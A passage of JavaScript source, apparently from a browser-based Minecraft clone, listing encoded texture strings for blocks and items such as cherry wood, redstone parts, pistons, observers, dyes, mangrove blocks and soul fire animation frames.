    redCactusFruit: "0g0g6000)ZZHWPY00000000000000000000000000000000^0002S002]00300i00i00i00iS003S0020000J00",
    purpleCactusFruit: "0g0g6000ZFY7ZYAY000000000000000000001|000{|002|002V00iP00jP00jyP00jyP00jyP00jy003P002|0000",
    
		//Some textures below from before minecraft 1.20
    cherry: "0g0g9000u(HqW(Z(ZJHYZZ000000000000g0000002000000020000000wh00000200g0000)SV0003QK00,O)]V00OO)]V00OO)]V003OQK000)SV00000000000000000000000000",
    /*cherryLogTop: "0g0ga-Z-WQZ{WYCWHZYW001hhg1gizNzzNOwj?VVw2[(2VV(2IMj]xj[]xiMj?MjIM2]@V@w3[Iw2V?M2OyzNzNx1g1hhg00",
    cherryLog: "0g0g3-W-ZVjZ1S1V05T@STl000Uk10kl11mU5S5qUkq?1?0U600",
    unused_cherryLogSW: "0g0g3-W-ZVjZ1116@@S@@@S61Q0p0pmT4615S6Tk6Qlppppppp4p440p",*/
		cherryLeaves: "0g0gf000{WZZZHZZ&HZiHYZWHW0i10)S15(4Q7gMjySJ*nOKzjzK3+5h0D1Klmh01+77G7Ah77^?60?Gd4Q^[>)stFQ?FDGM0yk",
		cherryLogTop: "0g0g9AW-Z(YHZrYoWHW0ix0xh0h3O))U>O(jGIIjO)O+MkQQQQ-T3[+Sk@QQ@Mk[]XX-Rk[]+T4[QQX@Sk[X-TAQQQQ,T3)OO*+SjGjOQ)?OVgh0hwh2h",
		cherryLog: "0g0g5(Y-ZQYAWUW5yS4]w0JA+iUwAAIw0]Pi0dQ0Fy20ioA+Fi0ir21Kg?]FFywly]9d1Pi00J0JPy>QP",
		greenCherryLeaves: "0g0g4000eWaW)Hoo0w66o6+8dK+0o6+w38KKK8w0+8K*8dIK+w0+o++6z603",
    //pinkCherryLeaves: "0g0g6ZYY000HZH5+>XF6{SF8a||^5//NFFS^2/F^Ir,^M^^w",
    //cherrySapling: "0g0g5000uZ9Y-ZAKY000000000000000000000000500000A00J9B,g0}000kr00^-000003000030000s00000r000+00",
    cherrySapling: "0g0gd000rYZZZZ&HUWZ(YAW-ZQYATZ00000000000000001023(Q400QBz0QK00QNG03S4>-G0ASGI0GO0GC01a80IGS7GI(0003(000BF0000029I000000000000000",
		
    "redstoneDustL": "0g0g4000YZZZY00S0000000001001(00800:005S0%0&:003I000w00000000000000000",
    "redstoneDustT": "0g0g4000YZZZY00S0000000001001(00a(000.S!yo000!K00000000000000000000",
    "redstoneDust+": "0g0g4000YZZZY00S0000000001001(008000.VS!&0&L003I008w00300000000200",
    "redstoneDustLine": "0g0g4000YZZZY00S0000000001001(000(000K00100000020003008000300000000200",
    "redstoneDustDot": "0g0g4000ZZZYY0000000000000000000004K00C00f<00r00pA002Q000g00000000000000000",
    
    gun: "0g0g4000VVH(WT4W0000000000000VV5VllHZl00l00l00l00l00n00W00f0000000",
    
    redstoneTorchOff: "0g0gc000U0W]0WE0WWHHViZSW;Z-Y)H0000000000000000000000000000000000000000000000000001w0000002(00000040000006000000400000040000006000000500000040000005000",
    redstoneTorch: "0g0gf0000WZKW(WZHZZZ0WHViZWSWH;Z-Y)H00000000000000000000000000000000000000000001g000000iM000000k0000001K0000007000000900000090000007000000b0000009000000b000",
    redstoneConnector: "0g0gbYZZZKYsHW0W;Z]0WZYVH1hhyyhhh)QQ?UQQT)QQQQQQT)QQQQQQT)QQQQT)Q@QQTQIQRQIQQQQQR)QQT)Q@QT)QQQQQQT)QQQQQQT)QQ?UQQTOOOGGOO(",
    lever: "0g0gc000ZW8WHHWSWViZ;Z-Y)H0000000000000000000000000000000000000000000000000001w0000003w00000040000006000000600000040000004000000500000060000005000",
    
    note:"08086000WJPWY?WW020202w0400400402010",
    
    slingshot: "0g0g6000W]HZY0Y000000000020C2g0wr00w00a0U00U00a2001000050000000005S00005S0000500000000000000500",
    
    repeater:[
			/*off*/"0g0gaY-YYZ$HYH0WQ0W$0W1h1h1hhh2OOyAQRMjAQRyOOMkRyyyyQxjOyOOyy(iyz5Nx0)Tnz0h2wnC(hgRgnJ+)1QN1nJNQjx3nJOM3wjoJOA(iwOoJOAxjARoJARMkRyQQROMhh1hhhh1",
    	/*on*/"0g0gaY-YYZ$HYH0W0H0W1h1h1hhh2OOyAQRMjAQRyOOMkRyyyyQxjOyOOyy(iyz5Nx0)Tnz0h2wnC(hgRgnJ+)1QN1nJNQjx3nJOM3wjoJOA(iwOoJOAxjARoJARMkRyQQROMhh1hhhh1",
    ],
    repeaterIcon: "0g0ge000XgH0WSgZH>WSWWYY)H0WbHE0W0000000000000000000000i0000000j0000000?0000000@0000000@00i00G00j0G000?h000@%G00c@000c00007000000000000000000000",
    
    pistonSide:"0g0gh$==8=B===4>=T4=(=E?=JP=0QxK8Mw9ax^IxXw.^Uw.F[/J*t3]tXw[>;8..s-Xt8X:Rh.xTRg;tq%M",
    pistonHeadSide:"0g0gc$==8=B===4>=0001yO(iOOgkV?VT[IIUVIGG0kkG./GTT0GTT0",
    pistonBack:"0g0g8T4=(=E?=8==JP=0i001e_K+^,/%|}Zef:hi<Pomr.d#,LKBi002S",
    pistonFront:"0g0g8c=>==B=45AdAICPNP9_B!P+A6P]CZHC+J&yZZBP7ZuB%",
    pistonFrontOpen:"0g0gaT4=(=?=8==JP=E==01hh00012OQ?yU(kO?B>B(l?yO)AiyR>)xV+?xGG5QFGhy2UhnJ?x3y]GGX)w3NOw4*yU)A?x5+ByB[2zORUNBMiU)BRU(hg000h0",
    pistonFrontSticky: "0g0geYsHZWWnH*WYYZZ<WkZMY1yz(3yygh?kh.<F$y%O1UIghIh,yC]RCVONA>1KcghDMj,Dh",
    
    superTntBottom: "0g0g4MW}H-ZBZkkkkZZZZkkkkZZZZkkkkZZZZkkkkZZZZ",
    superTntTop: "0g0g7RW+W-Z}gZVVHxZgTZ4]4]FNFN!4]4]FN;!]+[4c]!{;!l4]!NMOjFF",
    superTnt: "0g0ga@WWgZFZZZZ;ZY)HoZW0i0i0i0ihzhzhzhzhzhzhzhzyOyOyOyO0i0i0i0i?V@GUVG?GV@VUyOyOyOyO0i0i0i0ihzhzhzhzhzhzhzhzyzyzyzyz",
    
    observerTop: "0g0gv-Y)H(W$ZAJHZYW?kHVVHW|)ZHEY?WY-ZoHZZYZYEYZH8WHwWPAYJPW0Rxc0w0ggy1{B^yfF3MP{2=?Q=4hg1%QsgEqkgi9gub3Tu2ToQI<u4h01;1{B!y0Rxdww0ggy",
    observerFront: "0g0ggEY-YY-ZHVVH(WwWEJH;Z?4W)HsHZZ00W001hh000iOOyONNx4VVRyQ?T06hhg6KGIIGGGII:QQQQW=WP{{FF2}w2xkyyyyyyThh0ghhgh",
    observerSide: "0g0gcEY-YY-ZHVVH(WwWEJH)H;Z?4W001hh000iNOyOOOx4V?URyAT6hh0hKGIIGGGIIh0hhhh1g2OOyQRyTkVyA??UThh0ghhgh",
    observerBack: "0g0gfEY-YY-ZHVVH(WwWEJH)H;Z?4WgW]0WA0W001hh000iNOyOOOx4V?URyAT6hhKhKGIInGIIP@r#h0hkh1g2OOyQRyTkVyA??UThh0ghhgh",
    observerBackOn: "0g0glEY-YY-ZHVVHYZ(WwWEJH)H;Z?4W;YW0W0W0W]Z8W0004x8S0008xRoMT1aM2ggXES0^UFxaF^%O)*qq:*#8S0XAERg4w0OM89a8Qx]8Rg0w8Rgx",
    observerSideSW: "0g0gc-YEY;Z?4W)HwWHY(WVVH-ZEJH0gzOy?h16OyQ?9zOO#9)zA_9nOON#6nOyA_97OOOB9mROA?66KOyOBm9KOOy?n6KONA?9zOO*9ROA_7mOOO#66KOAQ_01yO)_g1",
    
    redDye: "0g0g7000HHjZZWH000000000000000000001S000i_Iw00%)000p00;00FrQ005w000J]00000000000000",
    string: "0g0g4000YH%kH0000004000&000j000.00f10b6K-4L4e)f]320$0f0000W00000",
    
    experienceOrb10: "0g0g8000WWcWZZZZcWPWZ02PA00JiS4]5,AJ+IBAJ@F&]FG&PYZPp&PYZPpFGF&]BAJ@5,AJ+I4]0JiS02PA0",
    experienceOrb9: "0g0g8000WWcWZZZZcWPWZ02PA00JJPiS4]5,AJ+IB.AJ@F%]FGFHFHFGF%]B.AJ@5,AJ+I4]0JJPiS02PA0",
    experienceOrb8: "0g0g8000WWcWZZZZcWPWZ02PA00JJPiS4]5CIB,AJ+FB@F&]FGFGF&]FB@B,AJ+5CI4]0JJPiS02PA0",
    experienceOrb7: "0g0g8000WWcWZZZZcWPWZ00000000PA002g00k00AJ)S5.B@I5&]5G5G5&]5.B@I0AJ)S0k002g000PA0000000",
    experienceOrb6: "0g0g8000WWcWZZZZcWPWZ00000000PA002g00k00S5,AJ+I5.&@I5,@5,@5.&@I5,AJ+I0S0k002g000PA0000000",
    experienceOrb5: "0g0g7000WWcWZZZZcWPW00000000PA002JPg00ky00S5DAJ)I5.%@I5.&@I5.&@I5.%@I5DAJ)I0S0ky002JPg000PA0000000",
    experienceOrb4: "0g0g7000WWcWZZZZcWPW00000000000000PA002g00k00AJ)S0BQS0&@S0&@S0BQS0AJ)S0k002g000PA0000000000000",
    experienceOrb3: "0g0g6000WWcWZZZZcW00000000000000PA002JPg00k00S0AJ)S0B)S0B)S0AJ)S0S0k002JPg000PA0000000000000",
    experienceOrb2: "0g0g5000WWcWZZZ00000000000000PA002JPg00k00S0S0S0S0S0S0k002JPg000PA0000000000000",
    experienceOrb1: "0g0g5000WWcWZZZ00000000000000000000PA002JPg00ky00k00k00k00k00ky002JPg000PA0000000000000000000",
    experienceOrb0: "0g0g5000WWcWZZZ00000000000000000000000000PA002]002g002g002g002g002]000PA0000000000000000000000000",
    
    lightGrayDye: "0g0g7000YYW$YW;Z000000000000001w000i^000w000005?t00_00i:000dGK000+00000000000000000000",
    lightBlueDye: "0g0g8000<YZHcZYt7WH00000000000000000000000000P4002&00n$000v}0P0{00dK000+00000000000000000000",
    magentaDye: "0g0g8000WHHYHZ/Y000000000000000000000000009A000200s00GS0S0WS0pi00b000%00000000000000000000",
    yellowDye: "0g0g7000WJYYWTYW0000000000g000000001CC0009^000020l0000*0<006000r00000000000000",
    purpleDye: "0g0g8000UHY{ZZW<WW000000000000000000000000009A000200s00GS0S0WS0pi00b000%00000000000000000000",
    orangeDye: "0g0g7000ZHZyYWgZ000000000000009w0000X000003U]0n%J0iV00_0p00cJ00100000000000000000000",
    whiteDye: "0g0g6000Z?mHYYZZZ00000000000000002]000Bng001J00bD020qFg00%JS1iN02E02pa00iTA00000000000000",
    greenDye: "0g0g6000%0YPYwHiZ*SZ0000000000g00000S00100aNl00I03yC!0phy0k00!^6C01V000r00000000000000",
    brownDye: "0g0g6000KHiWW4ZSH00000000000000000000000000aE000000a02yS0U|l2qESm@00S010000000000000000000",
    blackDye: "0g0g7000gMHoHAZ-W|DH4gY000000000000000000000000000000009AJ002QS0nz0I3EQSpm}Dq03O0c000000000000000000",
    pinkDye: "0g0g8000.HHY#HZ%HW000000000000000000000000009A000200s00GS0S0WS0pi00b000%00000000000000000000",
    limeDye: "0g0g8000MJYZGhWYxhYYKY000000000000000000000000009A000200s~00GS0S0WS0pi00b000%00000000000000000000",
    grayDye: "0g0g9000VVHHoHHT4WHZY00000000000000000000000000000000000hh00000hz)V0001+A00mOyO[*00i+zN[?00kzO>001QyQG000V>V00000VV000000000000000000000000000",
    cyanDye: "0g0g9000l@Yd5Y=:WxZ%Z^WtIHdCH00000000000000000001w000001jR10000lkw001*[R001+G00m*00m*,00j>U,[008>>Gw000yQy00000yy000000000000000000000000000",
    blueDye: "0g0g7000oZeWY*WlFY4W00000000000000000000000000100000^w002?00k03@JF3EV_q30000600000000000000",
    
    endPortal: "0g0gb0000xW8Z0gHkZ)Z8YlZcZAZgW000iz00000)O>000xMhhhi0xOhxNxn>nhlhOUhmThik+kOxkh@hjhlhm@hxpMhxik-mhx@mmhlhoxTjM)xmhjxh2hxTkh000jhOh00",
    thatch: "0g0g5WW1ZWRH5g@k?koQagU8TAPTkPT2TkT2@k>h?4)*h-o----dlkghQi9T49029Sg54hwXQT?T3hge)",
    
    reinforcedDeepslateBottom: "0g0g9HTZ$Z-HYYT4WP)ZY01yzNyg00?+GOU04mOSlGIGzNzN,NCGIGyIGGI-IG,IyOCGGNzzIGz+IGGNlIII4mGyMS0?,GU001yzNyg0",
    reinforcedDeepslateSide: "0g0geH9Y-H?W;WHY$HHY15WTZ$ZY1zOQVNgKDQQ*OR6oozNARK1X)*-g60>V-0V_[QOQ$1AQV)g1AO<RgKGy?O>[6ooz)[1)-gKXV]6Q>O$1yyg",
    reinforcedDeepslateTop: "0g0ga9YHY$Z-HHT4WP)ZYY1yO)>Oygl3@GQMxQ2zGGN)GOOQ>G>+,O.GP[[@+G[G>)+G)@))>>>zNwGO]ilj[G(1yO)>Oyg",
    packedMud: "0g0g6ZHUYYW5Y02Sa2Sn1nw8322I4-3090Q1Idsdw&hw&(Q00ggr3ddi21RAir1Aaz3w063]r>",
    mudBricks: "0g0g7AWWZmWQHZY5+5+IPI|k|J|r0Tw2Swo@PsFsP@]|sV)^APC+2Tw2Sw",
    mud: "0g0g7;H?3ZTkH-Z(YPAZ(H5+xF_g.A^@A795-!1DzF4p%]p0/XXUQI$)F>0}(~(6_@SoJ*QEseQ",
    muddyMangroveRootsSide: "0g0gb;H;W-Z{H(YQWPAZyZ?3ZTkH(H1iz?(zMl[Gg[,z8[.G?.0*A[p8VQjO5gyROEVo0O]Q]zShyQ,,(G3J,G[B>.)1U]NBTNk1UBTo5h2Tj",
    muddyMangroveRootsTop: "0g0gd;H{H;W-ZQW(YyZ>H(HTkH?3ZPAZ|)Y1z)gNxBlC3miykmhRyMjURiF0CxyhkNx3ABkB!ww2k>ihAiBFm.^2hMhQijk@gmEAIQihyThihli1jj",
    mangroveRootsSide: "0g0g5000;W{HQWyZ4Sxha2wiR4S2C4RS1(4yw1a1w1i1]1wz12w02Mx1k6Mw1QAag1]Ai00Aq900)350]0m340ma",
    mangroveRootsTop: "0g0g6000{H;WQWyZ>H50wAI3ayBF]i0d1]1giCR@g2|00&QgSwXyXI44c0K462AgJmERbxS]j1$ER9JE88Rwg]",
    mangroveLog: "0g0g5{HyZ>WQW;W0kJQIc01rwkIAX005yrd0AJP]]0A1PPwJ>6sA]A0PiJ0aQ0iPPg04J]109w+rJN11gP0JS",
    mangroveLogTop: "0g0ga{HQWyZ;W>WHZ3HZJW1xyj3NRwBVV?III?VVCBC@K@@@I@KBVV5IIIIU5VV0w4jx(Qw",
    mangrovePlanks: "0g0g73HHOYZHJWZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0G",
    strippedMangroveLogTop: "0g0g7ZWHZ3HZJW0i000]9A!aJ|BebD&fD*fDfD,e*fC#AP?b9C001wi0",
	  strippedMangroveLog: "0g0g5WZZWjW0g{+9%P1BdK)PxTdAPA(1AAd+9C9xSAddA|9PA%3P+1d1A+",
    mangroveLeaves: n => {
      var pix = getPixels("0g0g6PAYH000oHZY5wPS1^J?lz?l/B:iV#ale^>i{,?|O>(j$#:pXK]3{^+##}A$2!2")
      for (let i = 0; i < pix.length; i += 4) {
        var bright = avg(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    pearlescentFroglightSide: "0g0g8#YWY|WWZWZZZ4F)}|p~|NHZHZZZHZZHZH+[p&[l)m]",
    pearlescentFroglightTop: "0g0g6WY|WWWZZZ5)mIFzJ-}p!Jq}J}q}qFA4]",
    verdantFroglightSide: "0g0g8ZoHPYYHHZZZY4F)}|p~|NHZHZZZHZZHZH+[p&[l)m]",
    verdantFroglightTop: "0g0g6oHPYYHHZZY5)mIFzJ-}p!Jq}J}q}qFA4]",
    ochreFroglightSide: "0g0g8WZ-HWWYZZZZ4F)}|p~|NHZHZZZHZZHZH+[p&[l)m]",
    ochreFroglightTop: "0g0g6Z-HWWZZZZ5)mIFzJ-}p!Jq}J}q}qFA4]",
    mangroveTrapdoor: "0g0g9JWZHOYUW3HZH00001h101h0iO)QQ>Owl6KljgOO1M37hh5M31IIg58II(58II(3II38II51IIg57007(jgVV1Mlm00miKnO>6w1hhhhhhg",
    mangroveDoorConnected:[
			"0g0gaUWOY3HZHHJW)HZZ1g1xg0hz4U?VU?V>5>O+O)lO?Q?UO*)>OVUO>*UV>kB>4)x2>4)*>5)*>>l))@>l*?UAUUxABMw2>",
    	"0g0gaZHZJWHZOY3HUW)H1xMNz?+BMM)zNj?MxRA>?MxTkiV>NkTzOjXMnjjjjjjUUNz?jlUUzNl>lURAl??JhTll?2Dll)ThhQ?lDGjhhkQTh>*VVO*VO"
		],
    mangroveDoor: "0g0ga0003HHZJW)HOYUWZH000000000000000001yyyyw001y)>Nw005zNyOw006ACAw001AEAw001AA)xw005zCD006zEC001zA)xw001zCzw005AEAw006AA)Aw001zQQ>w002OOOO(0",
    
    blueRedstoneLamp: "0g0g8kY<Z1Z^ZHZvZNZFEZ0000004C981.e59a@.getD9X0S060dgejne{RKo951.e4k98000000",
    greenRedstoneLamp: "0g0g8pxZY,WHYHWZNW0000004C981.e59a@.getD9X0S060dgejne{RKo951.e4k98000000",
    yellowRedstoneLamp: "0g0g7-HWZWZWZZZHZW0000004C981.e59a@.getD9X0S060dgejne{RKo9I51.e4k98000000",
    redRedstoneLamp: "0g0g8-HZ0WAYY-ZWY0000004C981.e59a@.getD9X0S060dgejne{RKo951.e4k98000000",
    
    soulFire: "0g0g]00028H2oY2.W2PH2Y2Z2.H2EZ3sZ3cY2W2Z2H2W2W2Y7%WzH_HzHb<W2H2Z3sY2Y2WnZWYW:WnZf|YOZ[YH2Y7$ZYZZvWrZf|H3cH2HZZZZ7sZOZZZDHjYHZZZYZDY2H_YHZZZYb<HZZjZZZYZZZ#Y2Z2ZY0000000000000000000000000000000000000000000000000200000000000012000SS000000026gEKKS00sS01Qm(K00c4PjEU000K?/3S02XJ]NaV0?t3@0BbXcOn2O3@0)M#m;vC?m$6j-$UE#mQkF",
    "soulFire0": "0g0g]00028H2oY2.W2PH2Y2Z2.H2EZ3sZ3cY2W2Z2H2W2W2Y7%WzH_HzHb<W2H2Z3sY2Y2WnZWYW:WnZf|YOZ[YH2Y7$ZYZZvWrZf|H3cH2HZZZZ7sZOZZZDHjYHZZZYZDY2H_YHZZZYb<HZZjZZZYZZZ#Y2Z2ZY0000000000000000000000000000000000000000000000000200000000000012000SS000000026gEKKS00sS01Qm(K00c4PjEU000K?/3S02XJ]NaV0?t3@0BbXcOn2O3@0)M#m;vC?m$6j-$UE#mQkF",
    "soulFire1": "0g0g_00028H2oY2EZ2.W2oZ2W2Z2W2W2Y2Zb<HvW2W2W2Z2H2H7%WvHrW2H3sYf|H2HnZ2YjY,Z_YHb<W2PHOZYZZf|YZZZ2Z2Y>YH[YHzH7$Z3cY[YW:ZH~H_H2H2Y2YZZZDHZZZZ3sZZZZZZYYZZOZ2W7<WLZDYnZ2ZWYWY00000000000000000000000000000000000000000000000000000000000000028oSS0000001>6ewS0S004wTRdo-(1S00s2A!{6S00y[s/0yiMk]MPT06MM>krFC|({wS/p?ARXCI+xN+",
    "soulFire2": "0g0g?0002Z2Z2.W2PH28H2EZ2Y2W7%W2W2H2W2.H2Y2Hb<Hb<W2H2H2Z7$ZrWvH3sY2Y2H2oYjY_H3sZf|H>YW[YHOZDYf|Y3cHzHLZ2W2WzHDH2ZZ~HZZZ#Y:WY>YH,ZnZZZ[YWWYWYZZnZZZZ2WZZOZYZZZZY000000000000000000000000000000000000000000000000000000000000002coSK0000E9gE000--xywM1000wS>l$CcQvSh4qqT6{S0S]#@KaT#;CADrLReoa{b$^@u5Ck^2Ld8F6dwx",
		sun: "0w0wg00W4gW8wW8wHc(HgSHkYoKYsZwZsYAZEWZUYZYZY00000000000000000000000000000000000000hhhh00000000001hhhhhhg00000001hizyyNxhg000000hiOQQQQOxh000001iOQVVVVQOxg0000hzQVVQNh0000h)?GGU>h0001i)VV>xg001j?UMg001z?UNg00hARh00h)>h00hAZZRh00hAZZRh00hAZZRh00hAZZRh00h)>h00hARh001z?UNg001j?UMg001i)VV>xg000h)?GGU>h0000hzQVVQNh00001iOQVVVVQOxg00000hiOQQQQOxh0000001hizyyNxhg00000001hhhhhhg0000000000hhhh00000000000000000000000000000000000000",
    "soulFire3": "0g0g?0002oZ2EZ28H2oY2Y2Z2Y2W2PY2.H2PH2.W2Z2H3cH2W2W2H2Z2Y2W2Y2W7%Wb<WrW3sYvWzHnZj|Yf|HjYrZ3sZ2H2Yb<HLYZZZZDYZZjZ2HH#YWYWOZDH2H2ZZZvHf|Y2WYYYZZZYZZOZ7$Z_H>YW:W0000000000000000000000000000000000000000000000004cwSK0000001>7cw]000c[fwQy000Rn(-S00;4-A0KxRo1T004vRS00.Uu]^0anFkO0{(,PSc0^Oa:cp7<(c84!a*cX8Kb;40",
    "soulFire4": "0g0gS0002oZ2Z2H2Z2.H2EZ2oY28H2.W2H2W2W2Y2W2W2Z2Z3sZ2Y2PH2Yb<Wb<H2W2H2Z3sY3cY7$Z2Y2H2Hf|HLY7%WYLZZZnZjYzHvHrZ7<W2W2PY:ZWYWZZZZ:W2YvWWWDYOZYZYrW,ZzHf|Y0000000000000000000000000000000000000000gg00001w$|)00094b-3gK01kl01c)K01)^3dg01IVdVxV01T72&DOaTrs~$<Go%,]t?@>S6cSC",
    "soulFire5": "0g0g;0002EZ2PH2oY2Y2H2W2oZ28H2.H2W2Z2Z2.W2H2Z2Z2W2H2Y2PY2Y2Y2W2W2W2Zf|HvW3cH7%WnZ[YW7$Zf|Yb<W3sZ2HzHYZZ2H:WvHjYjZ,Z[YH#Y3sYb<H2Z7sZZZZYZZZOZZWW00000000000000000000000000000R4(00000000M5owTs0000>0?E4)000>4jg?A01VgxCp)016A@j1d4001MFDt1p,oQ0xd_2F}o|AsjUr.chzSQdqSsQ,7HnV",
    "soulFire6": "0g0gO0002oY2EZ2PH2oZ28H2Y2W2Z2.W2W2W2Y2PY2H2Y2H2W2Z2Z2.H2H7$ZrW2W2W3sY2Y2H3sZf|H3cY2ZnZOZDHjY2Zb<H3cHZZZ2Z2H7%WZWYW:W#Yf|YLZZ00000000000000000100000000000cTS000000016sRk000T0[Ed8000I8wF34000Jd8AFiT0000*-<000p*V00RRxIss02o}nw+{^o4jQX@JUS/9&SkS4r6Ej",
    "soulFire7": "0g0g&0002oY2EZ2.H2.W28H2W2Y2Z2H2PH2Z2PY2oZ2W2H2H2Z7$Z2W2Y2Y2Y3cH2Z2Wb<H3sZ3cYf|H2HY2ZnZ2WjY7%W2HZZZzH~HZZ2WZZY3sY000000000000000001400000000002cSS0000000>o0000hk0Io00002ko0000)w6s00xg|*l|000?d?Ks1pkE?ohD|40s9pP1E809cS00h]1RTaBPC^qCRh0",
    "soulFire8": "0g0gC0002oY28H2.H2PH2EZ2.W2PY2Y2Z2W2Z2Y2H2H2Y2H2Z2Y3cH2W2H2WvH2oZ3cY2FW2WZZZjYDYZY2W2Z_H7$Z>YW0000000000000000004w0000000001cTS00001R006sS00000R01>g00001T0]ok001T4R)E0000khEQoK00whoiagS0)01Xo1?lkR8K005-Pkg0062UR*680UbATx&Ey%(SJ9@2[ss0",
    "soulFire9": "0g0g!0002oY28H2EZ2.W2Z2H2Y2Z2PH2oZ2W2Y2W2FW2.H2H2W7$ZZf|HOZ2HZZDHZZZ_H2Y2HOZZ2W2ZzH3sZZZ,Z2H3sY[YHvHf|Y0000000000000000004g0000000002c(000000001cw00000000x34M20000000M@s7A00000s>4g00Rcd43c14{s00>4w00?xS0(00w00Sk4000000gQKSA0d)Uh7g(dM+00?Q2CN2@ap",
    "soulFire10": "0g0g$00028H2.W2PH2EZ2oY2Y2Z2W2.H2Z2H2oZDH2Z3cHf|H2W2HOZ7%WYDY2H2ZrWZZZLZnZf|YYZZZZY2Y2H,Z[YHvWb<W2ZYOZ7$ZY00000000000000000000000000000000000000000T00S00000000gT4k000000Tgg100000400?0000y680000000JwS0000000Tc(0000000R]wK0(w0000TkQ4001VxAK0pR0012E2SE)_",
    "soulFire11": "0g0g#00028H2oY2EZ2.W2oZ2PY2W2.H2PH3sZ2Z2H2W2Yb<W2YvHf|H2Z2ZZZZZ7$Z3sYZ~HZZvW7%WZZLZ:WnZ[YH,Z#YZ3cYZZb<HZZ_H00000000000000000000000000000000000000000R00S000000004000000000M50000000134w0000000h4o000000000c(00000000IA(00000000)S00001kU8(09315VV117VVK30VE9o|i2VqV",
    "soulFire12": "0g0gN00028H2oY2EZ2.W2Z2Z2W2Z2H2H3sZ3cH2.H2Y2WYWYW2Y2WZZZZZ,ZvW_H3sY2Z[YW2WzHDYb<H2W2PHOZzH2Y7%WWWZZ3cYYf|Y[YHOZ2HZ,W:WZZ00000000000000000000000000000000000000000000000000000S00000000S00000000000RcS00000000004g00000000028000000000w(Ew000007)?30001A1*kV011U?u025khJ2Dv@__c?k",
    "soulFire13": "0g0gN00028H2PH2.W2Y2Z2W2EZ2WzHnZvW2Z2H2oYZZZZZZH7%WjYjZ2PYZZ3sY2ZZZZZLZLY2Z2YrWY2WzHZb<WvHZZYZZDY,ZZYYf|Y>YHZZ0000000000000000000000000000000000000000000000000000000000000000g00000000000000000000000000000000wg0?c000000XsN9E00000e0?y000?lS0wO9*24*J?i0+h?nC?kc?k[c",
    "soulFire14": "0g0g.00028H2oY2oZ2EZ2Z2W7$Z3sY2Y2PY2Z#YYZZ#Y2Y2W2Hb<HZZZZZZZHb<W[YH:W2YjZzHzHf|H2H2W2YZZOZLZ3sZf|YZZWYW>YWZZZnZDY,ZrWOZ2WZZ2.H,W~HZZZZ00000000000000000000000000000000000000000000000000000000000000000000000000000000000000Rc044000000X4xwS00000d-Q00UX0VSK00o@w0TIiVVVoVVVVVV",
    "soulFire15": "0g0g<0002oY2.W28H2H2W2Zb<HDY~Hf|Y2Y2H2EZ2Z2PH3sYYZZZDH2H2.HnZ2PY2Wb<WnZ7$Z2Y2HrZ2W2WjYjZ2W3cY3sZZ:W_HZZZZZLYrWZZ2ZYZZWWYHZ2ZHZ,ZZZzHZZvH0000000000000000000000000000000000000000000000000000000000000000000000000000000000000g00XkKS0000g0xA(g000hP*l.K00Km601oP1FMK|e#&4",
    "soulFire16": "0g0g:00028H2Z2Y2oY2Zb<HvW3cH2H2PH2.W2EZ2Y#Y_HOZf|H2H2W3cY2W2H7$Z2Z2YLZf|YjYDH[YHHZ3sYZZZZZYDY2Z#Y>YHWYWb<W2WzHOZvHZZZZZZZrZLYZZ2WZZYZZZZ00000000000000000000000000000000000000000000000000000000000000000000000000S00R8(000000S0T@s^$00000}<48S00Rj(0QP$01i?01[t]hE9ACEP2EEv<#1tV.E",
    "soulFire17": "0g0gS0002EZ28H2Y2W3sZ2W2PY2oY2Zf|YzHjZ2H2H2.W2Z2PH2Z3sY2H2Z2.H7$Z2Y2W2Zb<Hf|HrWLZ2W2Y3cY2Y,ZZ#YnZLYnZ3cH2Y2HjYZZZZZZZvHZZDHZZY2HZj|YZZZZZ2WZHY0000000000000000000000000000000000000000000000000000000000000000014w000000000k0000200y^$};0004304l*lw001P4600EjP]9Ff1B%*f1dpFY",
    "soulFire18": "0g0g/0002PH2Y2H2Z2oY3cYb<H3sY2W28H2Y2EZ2W2Z2.H2H2.W2W2H2Y3cH7$Z2W2ZnZ,ZjY7%W2WWWZZZZYvWb<WGZf|Y2ZZZZnZ#Y[YHYf|HZ2WOZYZZZZ~HZZ>YHZZZ2YHZ00000000000000000000000000000000000000000000000000000000000000000RcTS000000016sTE0002039)00002MkJB)J(00?ldk0BQxx08DK8&2LAKE8smd&]R];*Jw8w8w",
    "soulFire19": "0g0g>0002oY2Y2Z2EZ2.W2H2W2H28H2H2W2W2oZ2W2.H2PY2Z2PH2H2Y2Y2Z2W2Z3sYf|H2Z2W2ZnZWYWZZZOZb<H3cH:WZZZZZZZZZ_H#Yb<W3sZYnZ2YYZZZZYOZLZ3cYjYzHLYZZZYZZZZ~HZZZ000000000000000000000000000000000000000000000000000000000000006g00000000002ewog00000800m(o00000xy[sQy00gnCcC08T2!4E00qQP7{R]90$#mS2|0%coU]gb0KKeiSdld1248gwa)wwS24eq",
    "soulFire20": "0g0g>0002oY2EZ2W2Z2.W2Y2H2.H2Y2PY2PH2Z2H2Z2Y2W2Y3sYnZZ3cY2Z2HWYW2Y2WHYHZ~H#Y7$ZrW3cH2WZZZZ:W2H3sZOZZZZZZzHZZ_HzHf|Yb<HvWnZY2oZ,ZYZZLZZZ[YHDH7%WZZZZZZZZ000000000000000000000000000000000000000000000000140000000000008cE00000000006ecS000000gw00cwgx00000((?bc$008w0y]R_00kO6R+00d1)E^!>00SAk760gyk+^Pq)!B^!UikIXT^iUA",
    "soulFire21": "0g0g?0002.H2Z2EZ2Y2PH2oY28H2oZ2.W2W2H2H2PY2H3sYzH7$Z2H3sZjZ2ZrWLYWYW#YnZ2Z2Y2Z7%Wb<W2Y:WZZZZZZ2W2W2Z2Y2ZnZHYjY2HOZ,Zb<H3cH2Wf|Yf|HZvW#Y_HZZZDYZGZHZZZZZ2W3cYZZ0000000000000000000000000000000000000000000000001440000000000038k(000000000076w-00000o1I6wSR00gQ64-2A00sNQa$@00A7xQx40lR?V#70xy?y_0eUb-y[PiA+z><]yQc^DJaQX,0.AyPx]yQii",
